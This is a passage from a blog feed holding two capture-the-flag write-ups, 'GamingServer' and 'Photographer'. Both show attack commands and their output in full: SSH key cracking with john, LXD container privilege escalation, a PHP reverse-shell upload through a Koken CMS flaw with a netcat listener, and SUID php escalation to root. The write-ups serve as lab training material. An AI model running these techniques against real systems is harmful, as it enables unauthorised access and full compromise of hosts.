Zmv1rDPL+0yzt6A5BHENXfkNfFWRWQxvKtiGlSLmywPP5OHnv0mzb16QG0Es1FPl
xhVyHt/WKlaVZfTdrJneTn8Uu3vZ82MFf+evbdMPZMx9Xc3Ix7/hFeIxCdoMN4i6
8BoZFQBcoJaOufnLkTC0hHxN7T/t/QvcaIsWSFWdgwwnYFaJncHeEj7d1hnmsAii
b79Dfy384/lnjZMtX1NXIEghzQj5ga8TFnHe8umDNx5Cq5GpYN1BUtfWFYqtkGcn
&amp;lt;&amp;lt;SNIP&amp;gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I used the ssh2john Python script to extract the password hash from the key file.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[root@parrot]─[/home/daz/Documents/TryHackMe/GamingServer]
└──╼ #/usr/share/john/ssh2john.py secretKey &amp;gt; cracked
┌─[root@parrot]─[/home/daz/Documents/TryHackMe/GamingServer]
└──╼ #cat cracked 
secretKey:$sshng$1$16$82823EE792E75948EE2DE731AF1A0547$1200$4fbf85fb78a59b915c159c76e269ebba0318e39e6f238eb5ce231be0d624f58255e6ec1caf1e107e53f6436564f
298711f83fe3cb6fbf6709cd12ac138f065074577a632c96dfda129b65acc52edab816366aeba68b2c8af6751c3be0ccc748c1739c523b8ecc581703d4a99b64cf9b13717d5a7dc87e214e7
f21de334d3b023bcaaab3aaafe5090c5d51acefb1769122da7f1d2625d72ebbfe5a477363355b65b8a672897227b245e20b4d7e627864aa3978232edf1339f6a999ca28f54fbfcf739440a3
1114b2b1b50a61c7271649c1d43c2e244c43fdeac64622c160e1ae31ab5cf84a1a80a906a52666e05b5c20e22bc317b20a1237daf26cf56f773d4a8732008919712963bfc834c5106a10dfd
f09e5561042d745161fda6220eba934d4a48d26eb2313a058984872913d04b5541389dd00c8b7b74e4c635534928effbef8739dd79971685527749d708031e20ff90ff62a70bb6dfed29b2f
2bb2820936dcdceeb299db530656a28e5fbe0fa312046e77dd2ce1d0d630451119d0765adc3bb982458638a3c3cb70f16c1a3c71d0798b4782bb708660bf80b8f583102ae77d900209971a8
6b35dddc878546d181ebe1cb0e5f15443cf5ff889985a7c30b682284a7963a398b87cdd0a8ac1ae2cd57201e8128f652fce83233844c9cddee666bf5ac33cbfb4cb3b7a03904710d5df90d7
c5591590c6f2ad8869522e6cb03cfe4e1e7bf49b36f5e901b412cd453e5c615721edfd62a569565f4ddac99de4e7f14bb7bd9f363057fe7af6dd30f64cc7d5dcdc8c7bfe115e23109da0c37
88baf01a1915005ca0968eb9f9cb9130b4847c4ded3fedfd0bdc688b1648559d830c276056899dc1de123eddd619e6b008a26fbf437f2dfce3f9678d932d5f5357204821cd08f981af13167
1def2e983371e42ab91a960dd4152d7d6158aad906727bf32d224cd3b44082a03e48f018f250a75def2037e36fffdfbffbfba279f785b4e9aba435369117ebf49859631f5390bc13a8e3f45
&amp;lt;&amp;lt;SNIP&amp;gt;&amp;gt;
┌─[root@parrot]─[/home/daz/Documents/TryHackMe/GamingServer]
└──╼ #
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now with the hash I can use john to crack.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[root@parrot]─[/home/daz/Documents/TryHackMe/GamingServer]
└──╼ #john cracked -w dict.lst 
Warning: only loading hashes of type &quot;SSH&quot;, but also saw type &quot;tripcode&quot;
Use the &quot;--format=tripcode&quot; option to force loading hashes of that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
          (secretKey)
1g 0:00:00:00 DONE (2020-09-06 15:20) 100.0g/s 354600p/s 354600c/s 354600C/s 1701d..sss
Session completed
┌─[root@parrot]─[/home/daz/Documents/TryHackMe/GamingServer]
└──╼ #
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;It doesn’t take long to crack. Using the key and password I should be able to SSH in to the machine. However, I dont know the username, going back to the HTML comment earlier, I will try with the username ‘john’. First I need to chmod 600 the key file before I can use it.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[root@parrot]─[/home/daz/Documents/TryHackMe/GamingServer]
└──╼ #chmod 600 secretKey 
┌─[root@parrot]─[/home/daz/Documents/TryHackMe/GamingServer]
└──╼ #ssh -i secretKey john@10.10.100.235
The authenticity of host '10.10.100.235 (10.10.100.235)' can't be established.
ECDSA key fingerprint is SHA256:LO5bYqjXqLnB39jxUzFMiOaZ1YnyFGGXUmf1edL6R9o.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.100.235' (ECDSA) to the list of known hosts.
Enter passphrase for key 'secretKey': 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-76-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Sep  6 14:23:42 UTC 2020

  System load:  0.0               Processes:           96
  Usage of /:   41.3% of 9.78GB   Users logged in:     0
  Memory usage: 40%               IP address for eth0: 10.10.100.235
  Swap usage:   0%


0 packages can be updated.
0 updates are security updates.


Last login: Mon Jul 27 20:17:26 2020 from 10.8.5.10
john@exploitable:~$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Im in! Lets grab the first flag.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;john@exploitable:~$ ls
user.txt
john@exploitable:~$ cat user.txt
a5c2ff8b9c2e
john@exploitable:~$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;privilege-escalation&quot;&gt;Privilege Escalation&lt;/h3&gt;

&lt;p&gt;Now on to the root flag. Doing the command ‘id’ shows John is part of many groups including ‘sudo’ and ‘lxd’. I tried ‘sudo -l’ but as I don’t have John’s password I cant run any commands as sudo.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;john@exploitable:~$ id
uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
john@exploitable:~$ sudo -l
[sudo] password for john: 
Sorry, try again.
[sudo] password for john: 
Sorry, try again.
[sudo] password for john: 
sudo: 3 incorrect password attempts
john@exploitable:~$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;However, lxd is interesting. LXD is a Linux container system. Googling ‘lxd privesc’ led me to an &lt;a href=&quot;https://www.hackingarticles.in/lxd-privilege-escalation/&quot;&gt;article&lt;/a&gt; with a overview of LXD, LXC and container technology. Also a step my step guide on how to use LXD to gain root privilege to the host machine.&lt;/p&gt;

&lt;p&gt;First I use git clone to download the alpine builder. Once downloaded I ran the build script.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[✗]─[root@parrot]─[/home/daz/Documents/TryHackMe/GamingServer]
└──╼ #git clone  https://github.com/saghul/lxd-alpine-builder.git
Cloning into 'lxd-alpine-builder'...
remote: Enumerating objects: 27, done.
remote: Total 27 (delta 0), reused 0 (delta 0), pack-reused 27
Receiving objects: 100% (27/27), 16.00 KiB | 199.00 KiB/s, done.
Resolving deltas: 100% (6/6), done.
┌─[root@parrot]─[/home/daz/Documents/TryHackMe/GamingServer]
└──╼ #cd lxd-alpine-builder
┌─[root@parrot]─[/home/daz/Documents/TryHackMe/GamingServer/lxd-alpine-builder]
└──╼ #sudo ./build-alpine
Determining the latest release... v3.12
Using static apk from http://dl-cdn.alpinelinux.org/alpine//v3.12/main/x86_64
Downloading alpine-mirrors-3.5.10-r0.apk
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
Downloading alpine-keys-2.2-r0.apk
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
Downloading apk-tools-static-2.10.5-r1.apk
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
alpine-devel@lists.alpinelinux.org-4a6a0840.rsa.pub: OK
Verified OK
Selecting mirror http://mirror1.hs-esslingen.de/pub/Mirrors/alpine/v3.12/main
fetch http://mirror1.hs-esslingen.de/pub/Mirrors/alpine/v3.12/main/x86_64/APKINDEX.tar.gz
(1/19) Installing musl (1.1.24-r9)
(2/19) Installing busybox (1.31.1-r19)
Executing busybox-1.31.1-r19.post-install
(3/19) Installing alpine-baselayout (3.2.0-r7)
Executing alpine-baselayout-3.2.0-r7.pre-install
Executing alpine-baselayout-3.2.0-r7.post-install
(4/19) Installing openrc (0.42.1-r11)
Executing openrc-0.42.1-r11.post-install
(5/19) Installing alpine-conf (3.9.0-r1)
(6/19) Installing libcrypto1.1 (1.1.1g-r0)
(7/19) Installing libssl1.1 (1.1.1g-r0)
(8/19) Installing ca-certificates-bundle (20191127-r4)
(9/19) Installing libtls-standalone (2.9.1-r1)
(10/19) Installing ssl_client (1.31.1-r19)
(11/19) Installing zlib (1.2.11-r3)
(12/19) Installing apk-tools (2.10.5-r1)
(13/19) Installing busybox-suid (1.31.1-r19)
(14/19) Installing busybox-initscripts (3.2-r2)
Executing busybox-initscripts-3.2-r2.post-install
(15/19) Installing scanelf (1.2.6-r0)
(16/19) Installing musl-utils (1.1.24-r9)
(17/19) Installing libc-utils (0.7.2-r3)
(18/19) Installing alpine-keys (2.2-r0)
(19/19) Installing alpine-base (3.12.0-r0)
Executing busybox-1.31.1-r19.trigger
OK: 8 MiB in 19 packages
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I now have a .tar.gz file I can copy on to the victim machine.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[root@parrot]─[/home/daz/Documents/TryHackMe/GamingServer/lxd-alpine-builder]
└──╼ #ls
alpine-v3.12-x86_64-20200906_1552.tar.gz  build-alpine  LICENSE  README.md
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Using Python3 I started a http server.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[root@parrot]─[/home/daz/Documents/TryHackMe/GamingServer/lxd-alpine-builder]
└──╼ #python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Back on the victim machine, I use wget to download the file.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;john@exploitable:~$ cd /tmp
john@exploitable:/tmp$ wget http://10.8.21.217/alpine-v3.12-x86_64-20200906_1552.tar.gz
--2020-09-06 14:55:47--  http://10.8.21.217/alpine-v3.12-x86_64-20200906_1552.tar.gz
Connecting to 10.8.21.217:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3109382 (3.0M) [application/gzip]
Saving to: ‘alpine-v3.12-x86_64-20200906_1552.tar.gz’

alpine-v3.12-x86_64-20200906_1552.tar 100%[========================================================================&amp;gt;]   2.96M  1.01MB/s    in 2.9s

2020-09-06 14:55:50 (1.01 MB/s) - ‘alpine-v3.12-x86_64-20200906_1552.tar.gz’ saved [3109382/3109382]

john@exploitable:/tmp$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Still following the steps from the article, I import the image and run, mounting the root file system.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;john@exploitable:/tmp$ lxc image import ./alpine-v3.12-x86_64-20200906_1552.tar.gz --alias myimage
Image imported with fingerprint: 4397c7dce96e22e14f6c108eebaeb629f21273dd5a7791754ad0a082c026b09c
john@exploitable:/tmp$ lxc image list
+---------+--------------+--------+-------------------------------+--------+--------+-----------------------------+
|  ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE         |
+---------+--------------+--------+-------------------------------+--------+--------+-----------------------------+
| myimage | 4397c7dce96e | no     | alpine v3.12 (20200906_15:52) | x86_64 | 2.97MB | Sep 6, 2020 at 2:56pm (UTC) |
+---------+--------------+--------+-------------------------------+--------+--------+-----------------------------+
john@exploitable:/tmp$ lxc init myimage ignite -c security.privileged=true
Creating ignite
john@exploitable:/tmp$ lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
Device mydevice added to ignite
john@exploitable:/tmp$ lxc start ignite
john@exploitable:/tmp$ lxc exec ignite /bin/sh
id~ # id
uid=0(root) gid=0(root)
~ # cd /mnt/root/root/
/mnt/root/root # ls
root.txt
/mnt/root/root # cat root.txt 
2e337b8c9f3a
/mnt/root/root # 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;We have the root flag! Thank you for reading.&lt;/p&gt;</content>

      
      
      
      
      

      <author>
          <name>Darryn</name>
        
        
      </author>

      

      
        <category term="tryhackme" />
      
        <category term="ctf" />
      
        <category term="oscp" />
      

      
        <summary type="html"></summary>
      

      
      
    </entry>
  
    <entry>
      <title type="html">Photographer Write Up</title>
      <link href="https://darrynbrownfield.co.uk/photographer" rel="alternate" type="text/html" title="Photographer Write Up" />
      <published>2020-09-05T00:00:00+00:00</published>
      <updated>2020-09-05T00:00:00+00:00</updated>
      <id>https://darrynbrownfield.co.uk/photographer</id>
      <content type="html" xml:base="https://darrynbrownfield.co.uk/photographer">&lt;p&gt;&lt;img src=&quot;/assets/images/photographer.png&quot; alt=&quot;Photographer&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;overview&quot;&gt;Overview&lt;/h3&gt;

&lt;p&gt;Photographer was the last machine I did before I took my OSCP exam so it seemed fitting for it to be the first write up on my new blog. Photographer was a great OSCP like machine created by &lt;a href=&quot;https://twitter.com/v1n1v131r4&quot;&gt;v1n1v131r4&lt;/a&gt;.&lt;/p&gt;

&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;

&lt;p&gt;Starting with a Nmap scan lets see what ports are open. I got the IP of the machine by checking the DHCP server on my network. However, I could have used arp-scan to find the IP address.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/Vulnhub/Photographer]
└──╼ $nmap -sC -sV -oA nmap/initial 192.168.1.77
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-01 17:54 BST
Nmap scan report for 192.168.1.77
Host is up (0.0012s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE     VERSION
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Photographer by v1n1v131r4
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
8000/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: Koken 0.22.24
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: daisa ahomi
|_http-trane-info: Problem with XML parsing of /evox/about
Service Info: Host: PHOTOGRAPHER

Host script results:
|_clock-skew: mean: 1h19m59s, deviation: 2h18m33s, median: 0s
|_nbstat: NetBIOS name: PHOTOGRAPHER, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: &amp;lt;unknown&amp;gt; (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: photographer
|   NetBIOS computer name: PHOTOGRAPHER\x00
|   Domain name: \x00
|   FQDN: photographer
|_  System time: 2020-09-01T12:54:28-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-09-01T16:54:28
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.80 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The scan reveals 4 ports open, Samba and two web. Based on the HTTP banners it looks to be a Linux Ubuntu machine, Googling apache 2.4.18 ubuntu reveals the OS is probably Ubuntu Xenial 16.04 LTS.&lt;/p&gt;

&lt;h3 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h3&gt;

&lt;p&gt;I started with port 80 but didn’t find anything interesting. I ran Gobuster and Nikto and both came up blank so decided to move on for now. On port 8000 I’m presented with a CMS type page. Looking at the footer indicates ‘Built with Koken’.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/photographer/Port-8000.png&quot; alt=&quot;Port 8000&quot; /&gt;&lt;/p&gt;

&lt;p&gt;A quick Google shows &lt;a href=&quot;http://koken.me/&quot;&gt;Koken&lt;/a&gt; is a CMS for photographers. An &lt;a href=&quot;https://www.exploit-db.com/exploits/48706&quot;&gt;exploit&lt;/a&gt; is also available by the same author of the machine which would indicate this is the intend path. However, the exploit requires authentication.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/photographer/exploit.png&quot; alt=&quot;Exploit&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Looking at the exploit, the POST request makes a call to &lt;strong&gt;/admin/&lt;/strong&gt;. Going to the URL does provide a login page requiring a email address and password. I will take a look at Samba before going any further on the web ports.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/photographer/login.png&quot; alt=&quot;Login&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Using smbclient and logging in anonymously shows one share in particular that looks interesting ‘sambashare’.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/Vulnhub/Photographer]
└──╼ $smbclient -L \\\\192.168.1.77\\

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        sambashare      Disk      Samba on Ubuntu
        IPC$            IPC       IPC Service (photographer server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
┌─[daz@parrot]─[~/Documents/Vulnhub/Photographer]
└──╼ $smbclient \\\\192.168.1.77\\sambashare\\
Enter WORKGROUP\daz\'s password: 
Try &quot;help&quot; to get a list of possible commands.
smb: \&amp;gt; ls
  .                                   D        0  Tue Jul 21 02:30:07 2020
  ..                                  D        0  Tue Jul 21 10:44:25 2020
  mailsent.txt                        N      503  Tue Jul 21 02:29:40 2020
  wordpress.bkp.zip                   N 13930308  Tue Jul 21 02:22:23 2020

                278627392 blocks of size 1024. 264268400 blocks available
smb: \&amp;gt; mget *
Get file mailsent.txt? y
getting file \mailsent.txt of size 503 as mailsent.txt (245.6 KiloBytes/sec) (average 245.6 KiloBytes/sec)
Get file wordpress.bkp.zip? y
getting file \wordpress.bkp.zip of size 13930308 as wordpress.bkp.zip (67013.8 KiloBytes/sec) (average 66362.5 KiloBytes/sec)
smb: \&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Two files are on the share, the first is an email from Agi to Daisa advising the site is ready and the other file appears to be a backup zip of the site.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/Vulnhub/Photographer]
└──╼ $cat mailsent.txt 
Message-ID: &amp;lt;4129F3CA.2020509@dc.edu&amp;gt;
Date: Mon, 20 Jul 2020 11:40:36 -0400
From: Agi Clarence &amp;lt;agi@photographer.com&amp;gt;
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.0.1) Gecko/20020823 Netscape/7.0
X-Accept-Language: en-us, en
MIME-Version: 1.0
To: Daisa Ahomi &amp;lt;daisa@photographer.com&amp;gt;
Subject: To Do - Daisa Website\'s
Content-Type: text/plain; charset=us-ascii; format=flowed
Content-Transfer-Encoding: 7bit

Hi Daisa!
Your site is ready now.
Don\'t forget your secret, my babygirl ;)
┌─[daz@parrot]─[~/Documents/Vulnhub/Photographer]
└──╼ $
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;‘babygirl’ looks to be a hint to the password and I now have 2 users and email addresses:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Agi Clarence - agi@photographer.com&lt;/li&gt;
  &lt;li&gt;Daisa Ahomi - daisa@photographer.com&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;foot-hold&quot;&gt;Foot hold&lt;/h3&gt;

&lt;p&gt;I go back to port &lt;strong&gt;8000/admin/&lt;/strong&gt; and try them out. I get straight in with &lt;strong&gt;daisa@photographer.com&lt;/strong&gt; and &lt;strong&gt;babygirl&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/photographer/cms.png&quot; alt=&quot;CMS&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Going back to the exploit from earlier, it looks like I can upload a PHP file by saving the file as .jpg then use Burp to rename it. Im going to try and upload a reverse shell PHP script. If your using Kali or ParrotOS the script can be found in /usr/share/webshells/php/ or downloaded from &lt;a href=&quot;http://pentestmonkey.net/tools/web-shells/php-reverse-shell&quot;&gt;pentestmonkey&lt;/a&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/Vulnhub/Photographer]
└──╼ $cp /usr/share/webshells/php/php-reverse-shell.php .
┌─[daz@parrot]─[~/Documents/Vulnhub/Photographer]
└──╼ $mv php-reverse-shell.php shell.php.jpg
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I update the script with my local IP and port details.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;$ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Start a netcat listener ready to catch the shell.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/Vulnhub/Photographer]
└──╼ $sudo nc -nvlp 443
listening on [any] 443 ...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Going back to the admin page I upload the file using ‘Import content’ and find the PHP file. With Burp open and proxy intercept on I set Burp as a proxy in my browser and select ‘Import’.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/photographer/content.png&quot; alt=&quot;Content&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In Burp I can now remove the .jpg extension from the file and forward the request.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/photographer/burp.png&quot; alt=&quot;Burp&quot; /&gt;&lt;/p&gt;

&lt;p&gt;With the file selected, right clicking on ‘Download File’ and ‘Open Link in New Tab’ should run out PHP script.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/photographer/downloadfile.png&quot; alt=&quot;DownloadFile&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I have a shell as www-data! First thing I always do is upgrade it to a more stable TTY using Python.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/photographer/shell.png&quot; alt=&quot;Shell&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The first flag can be found in Daisa’s user directory.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;www-data@photographer:/$ cd home/daisa/
www-data@photographer:/home/daisa$ ls
Desktop    Downloads  Pictures  Templates  examples.desktop
Documents  Music      Public    Videos     user.txt
www-data@photographer:/home/daisa$ cat user.txt 
d41d8cd98f00{REDACTED}
www-data@photographer:/home/daisa$
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;privilege-escalation&quot;&gt;Privilege Escalation&lt;/h3&gt;

&lt;p&gt;I now need to escalate out of www-data to either a user or root. Im going to use &lt;a href=&quot;https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite&quot;&gt;linpeas&lt;/a&gt; to enumerate the machine for possible local privilege escalation paths. First I will use Python to copy the script from my machine.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/photographer/linpeas.png&quot; alt=&quot;linpeas&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Linpeas provides a lot of output, looking through the output &lt;strong&gt;/usr/bin/php7.2&lt;/strong&gt; jumps out.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Linpeas will colour code the output based on severity but notice /usr/bin/php7.2 is green. Its important to review all the output and not rely on the scripts/tools to identify potential attack vectors.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/photographer/suid.png&quot; alt=&quot;suid&quot; /&gt;&lt;/p&gt;

&lt;p&gt;First I will check &lt;a href=&quot;https://gtfobins.github.io&quot;&gt;GTFOBins&lt;/a&gt;, searching PHP.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/photographer/phpsuid.png&quot; alt=&quot;gtfobins&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Lets give it a go.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;www-data@photographer:/tmp$ CMD=&quot;/bin/sh&quot;
www-data@photographer:/tmp$ /usr/bin/php7.2 -r &quot;pcntl_exec('/bin/sh', ['-p']);&quot;
# id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
# whoami
root
#
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;We have root! Lets grab the flag.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;# 
# cd /root
# cat proof.txt
                                                                
                                .:/://::::///:-`                
                            -/++:+`:--:o:  oo.-/+/:`            
                         -++-.`o++s-y:/s: `sh:hy`:-/+:`         
                       :o:``oyo/o`. `      ```/-so:+--+/`       
                     -o:-`yh//.                 `./ys/-.o/      
                    ++.-ys/:/y-                  /s-:/+/:/o`    
                   o/ :yo-:hNN                   .MNs./+o--s`   
                  ++ soh-/mMMN--.`            `.-/MMMd-o:+ -s   
                 .y  /++:NMMMy-.``            ``-:hMMMmoss: +/  
                 s-     hMMMN` shyo+:.    -/+syd+ :MMMMo     h  
                 h     `MMMMMy./MMMMMd:  +mMMMMN--dMMMMd     s. 
                 y     `MMMMMMd`/hdh+..+/.-ohdy--mMMMMMm     +- 
                 h      dMMMMd:````  `mmNh   ```./NMMMMs     o. 
                 y.     /MMMMNmmmmd/ `s-:o  sdmmmmMMMMN.     h` 
                 :o      sMMMMMMMMs.        -hMMMMMMMM/     :o  
                  s:     `sMMMMMMMo - . `. . hMMMMMMN+     `y`  
                  `s-      +mMMMMMNhd+h/+h+dhMMMMMMd:     `s-   
                   `s:    --.sNMMMMMMMMMMMMMMMMMMmo/.    -s.    
                     /o.`ohd:`.odNMMMMMMMMMMMMNh+.:os/ `/o`     
                      .++-`+y+/:`/ssdmmNNmNds+-/o-hh:-/o-       
                        ./+:`:yh:dso/.+-++++ss+h++.:++-         
                           -/+/-:-/y+/d:yh-o:+--/+/:`           
                              `-///////////////:`               
                                                                

Follow me at: http://v1n1v131r4.com


d41d8cd98f00{REDACTED}
#
&lt;/code&gt;&lt;/pre&gt;</content>

      
      
      
      
      

      <author>
          <name>Darryn</name>
        
        
      </author>

      

      
        <category term="vulnhub" />
      
        <category term="ctf" />
      
        <category term="oscp" />
      

      
        <summary type="html"></summary>
      

      
      
    </entry>
  
</feed>
